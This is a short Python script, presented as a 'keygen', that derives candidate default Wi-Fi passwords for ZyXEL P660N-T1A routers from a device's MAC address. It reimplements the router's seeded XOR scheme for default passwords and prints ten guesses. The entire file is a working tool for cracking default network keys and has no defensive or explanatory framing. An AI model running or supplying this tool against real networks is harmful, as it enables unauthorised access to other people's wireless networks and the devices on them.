# Keygen for the p660n-t1a with a SSID of ZyXELddddlLd
# Will generate 10 possible passwords

import hashlib
import argparse

def p660n_t1a(mac):

	long_mac = mac * 4
	seed = int("12345678", 16)
	pseudo_random = []

	for i in range(0, 40, 2):
		int1 = int(long_mac[i:i+2], 16)
		xor_mask1 = seed & 255
		xor_mask2 = seed >> 5 & 255
		new_byte1 = int1 ^ xor_mask1
		new_byte2 = new_byte1 ^ xor_mask2
		pseudo_random.append(new_byte2)

		new_seed = seed >> 8
		seed_modifier = new_byte2 << 15
		seed = new_seed | seed_modifier

	digits = "".join([chr(48 + i % 10) for i in pseudo_random])
	letters = "".join([chr(97 + i % 26) for i in pseudo_random])

	ssid = "ZyXEL%s%s" % (digits[4:8], letters[3:6])
	password = letters[10:19]
	password = "%s%s%s" % (password[0:1], password[1:2].upper(), password[2:])

	for i in range(0, 10):
		print(password+str(i))
	#print(ssid)


parser = argparse.ArgumentParser(description='Keygen for the p660n-t1a with a SSID of ZyXELddddlLd')
parser.add_argument('mac', help='Mac address')
args = parser.parse_args()

p660n_t1a(args.mac)